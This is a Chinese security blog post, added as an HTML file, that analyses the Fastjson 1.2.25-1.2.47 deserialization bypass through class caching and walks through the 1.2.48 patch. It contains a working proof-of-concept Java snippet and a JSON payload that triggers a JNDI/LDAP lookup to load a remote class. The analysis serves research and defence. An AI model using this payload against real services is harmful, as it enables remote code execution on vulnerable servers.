@@ -1,0 +1,623 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,Java,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/kanxi.jpg">
+  
+  <title>Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType） [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+      <img class="avatar" src="/j.jpg">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="post" class="pure-menu-link">文章</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/archives" style="color:#202020;" class="pure-menu-link">归档</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories" style="color:#202020;" class="pure-menu-link">分类</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/tags" style="color:#202020;" class="pure-menu-link">标签</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="Web安全" class="pure-menu-link">Web安全</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Web安全基础/" style="color:#202020;" class="pure-menu-link">Web安全基础&amp;Tricks</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">Web安全之机器学习</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Web/" style="color:#202020;" class="pure-menu-link">WriteUp Web</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="PHP" class="pure-menu-link">PHP</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/PHP/" style="color:#202020;" class="pure-menu-link">PHP安全</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">CMS</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="Java" class="pure-menu-link">Java</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Java/" style="color:#202020;" class="pure-menu-link">Java安全</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">Struts2</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="https://www.mi1k7ea.com/categories/Java/Spring/" style="color:#202020;" class="pure-menu-link">Spring</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">SpringCloud</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="Python" class="pure-menu-link">Python</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Python/" style="color:#202020;" class="pure-menu-link">Python安全</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="https://www.mi1k7ea.com/categories/Python/Python安全开发/" style="color:#202020;" class="pure-menu-link">Python安全开发</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">爬虫</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">Django</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="JavaScript" class="pure-menu-link">JavaScript</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/JavaScript/" style="color:#202020;" class="pure-menu-link">JavaScript安全</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">Node.js</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="GO" class="pure-menu-link">GO</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">GO安全</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="二进制安全" class="pure-menu-link">二进制安全</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/二进制基础/" style="color:#202020;" class="pure-menu-link">二进制基础</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/C-C/" style="color:#202020;" class="pure-menu-link">C/C++</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">Fuzzing</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Pwn/" style="color:#202020;" class="pure-menu-link">Pwn</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Pwn/" style="color:#202020;" class="pure-menu-link">WriteUp Pwn</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Reverse/" style="color:#202020;" class="pure-menu-link">WriteUp Reverse</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="渗透测试" class="pure-menu-link">渗透测试</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">基础&amp;Tricks</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">Kali</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">Metasploit</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">内网渗透</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">提权</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">免杀</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">工具</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="OS" class="pure-menu-link">OS</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">Windows</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/404" style="color:#202020;" class="pure-menu-link">Linux</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="about" class="pure-menu-link">关于</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/about" style="color:#202020;" class="pure-menu-link">Mi1k7ea</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="https://blog.csdn.net/ski_12" style="color:#202020;" class="pure-menu-link">CSDN博客</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/atom.xml" style="color:#202020;" class="pure-menu-link">订阅</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-11-11T13:54:53.000Z">
+        2019-11-11
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Fastjson 1.2.x系列的1.2.25-1.2.47版本。</p>
+<h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>主要是JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。</p>
+<h2 id="0x03-复现利用"><a href="#0x03-复现利用" class="headerlink" title="0x03 复现利用"></a>0x03 复现利用</h2><p>本次Fastjson反序列化漏洞也是基于checkAutoType()函数绕过的，并且无需开启AutoTypeSupport，大大提高了成功利用的概率。</p>
+<p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p>
+<p>Demo如下，无需开启AutoTypeSupport，本地Fastjson用的是1.2.47版本：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload  = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span></span><br><span class="line">                + <span class="string">"\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span></span><br><span class="line">                + <span class="string">"\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true&#125;&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此外，还需要开启RMI服务或LDAP服务以及放置恶意类的Web服务，具体可参考之前的Fastjson系列文章即可。</p>
+<p>运行能成功弹计算器：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/1.png" alt=""></p>
+<p>这里，我们看看PoC是怎么写的：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。</p>
+<p>但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：</p>
+<ul>
+<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li>
+<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li>
+</ul>
+<h2 id="0x04-调试分析"><a href="#0x04-调试分析" class="headerlink" title="0x04 调试分析"></a>0x04 调试分析</h2><p>下面我们来调试分析下该PoC为啥会成功。</p>
+<h3 id="不受AutoTypeSupport影响的版本"><a href="#不受AutoTypeSupport影响的版本" class="headerlink" title="不受AutoTypeSupport影响的版本"></a>不受AutoTypeSupport影响的版本</h3><p>不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。</p>
+<h4 id="未开启AutoTypeSupport时"><a href="#未开启AutoTypeSupport时" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>在调用DefaultJSONParser.parserObject()函数时，其会对JSON数据进行循环遍历扫描解析。</p>
+<p>在第一次扫描解析中，进行checkAutoType()函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，该类在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/2.png" alt=""></p>
+<p>往下调试，调用到MiscCodec.deserialze()，其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/3.png" alt=""></p>
+<p>接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/4.png" alt=""></p>
+<p>在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/5.png" alt=""></p>
+<p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/6.png" alt=""></p>
+<h4 id="开启AutoTypeSupport时"><a href="#开启AutoTypeSupport时" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><p>由前面知道，开启AutoTypeSupport后，在checkAutoType()函数中会进入黑白名单校验的代码逻辑。</p>
+<p>在第一部分JSON数据的扫描解析中，由于@type指向java.lang.Class，因此即使是开启AutoTypeSupport先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/7.png" alt=""></p>
+<p>关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类”com.sun.rowset.JdbcRowSetImpl”，其中的”com.sun.”是在denyList黑名单中的，但是为何在检测时能成功绕过呢？</p>
+<p>我们调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure>
+<p>第一个判断条件<code>Arrays.binarySearch(denyHashCodes, hash) &gt;= 0</code>是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，这里由于前面已经将com.sun.rowset.JdbcRowSetImpl类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。</p>
+<h3 id="受AutoTypeSupport影响的版本"><a href="#受AutoTypeSupport影响的版本" class="headerlink" title="受AutoTypeSupport影响的版本"></a>受AutoTypeSupport影响的版本</h3><p>受AutoTypeSupport影响的版本为1.2.25-1.2.32，本次调试的是1.2.25版本。</p>
+<h4 id="开启AutoTypeSupport时-1"><a href="#开启AutoTypeSupport时-1" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><p>我们在开启AutoTypeSupport之后，会利用失败，报如下错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure>
+<p>调试发现，在第一部分JSON数据的解析中，checkAutoType()函数的处理过程和前面是差不多的。能够成功通过该函数的检测，因此问题不在这，继续往下调试。</p>
+<p>在第二部分JSON数据的解析中，@type指向的”com.sun.rowset.JdbcRowSetImpl”在checkAutoType()函数中会被dentList黑名单中的”com.sun.”匹配到，因此会直接报错显示不支持：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/8.png" alt=""></p>
+<p>可以明显看到，第一个if语句是白名单过滤，第二个if语句是黑名单过滤，其中黑名单过滤的if语句中的判断条件和前面的不受影响的版本的不一样，对比下是少了个判断条件，即<code>TypeUtils.getClassFromMapping(typeName) == null</code>。</p>
+<h4 id="未开启AutoTypeSupport时-1"><a href="#未开启AutoTypeSupport时-1" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>当不开启AutoTypeSupport时就不会进入该黑白名单校验的代码逻辑中，就不会被过滤报错。</p>
+<p>这里，我们换个不受AutoTypeSupport影响的且未使用哈希黑名单的版本来方便我们进行对比查看，这里选了1.2.33，看下checkAutoType()中对应的代码：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/9.png" alt=""></p>
+<p>对比黑名单校验的if判断语句条件就知道了，为什么后面的版本不受影响，那是因为通过<code>&amp;&amp;</code>多添加了一个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，但是第二部分JSON内容中的类已经通过第一部分解析的时候加载到Map中缓存了，因此该条件不成立从而成功绕过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p>
+<p>运行会报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure>
+<p>调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</p>
+<p>1.2.48版本：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/10.png" alt=""></p>
+<p>1.2.47版本：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/13.png" alt=""></p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/14.png" alt=""></p>
+<p>导致目标类并不能缓存到Map中了：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/11.png" alt=""></p>
+<p>因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用TypeUtils.getClassFromMapping()来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉：</p>
+<p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/12.png" alt=""></p>
+<hr>
+<p>OK，19年的Fastjson反序列化漏洞就分析到这，后面是Fastjson系列的最后一篇了，说下检测与防御方法、高版本JDK绕过等等。</p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-影响版本"><span class="toc-text">0x01 影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-限制"><span class="toc-text">0x02 限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-复现利用"><span class="toc-text">0x03 复现利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-调试分析"><span class="toc-text">0x04 调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#不受AutoTypeSupport影响的版本"><span class="toc-text">不受AutoTypeSupport影响的版本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#未开启AutoTypeSupport时"><span class="toc-text">未开启AutoTypeSupport时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开启AutoTypeSupport时"><span class="toc-text">开启AutoTypeSupport时</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#受AutoTypeSupport影响的版本"><span class="toc-text">受AutoTypeSupport影响的版本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#开启AutoTypeSupport时-1"><span class="toc-text">开启AutoTypeSupport时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#未开启AutoTypeSupport时-1"><span class="toc-text">未开启AutoTypeSupport时</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-补丁分析"><span class="toc-text">0x05 补丁分析</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+<div class="share" style="width: 100%;">
+  <img src="" alt="" style="margin: auto; display: block;"/>
+
+  <div style="margin: auto; text-align: center; font-size: 0.8em; color: grey;">test</div>
+  
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/" rel="next" title="Fastjson系列三——历史版本补丁绕过（需开启AutoType）">
+          Fastjson系列三——历史版本补丁绕过（需开启AutoType）
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_uv">本站总访问量 <span id="busuanzi_value_site_uv"></span> 次</span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
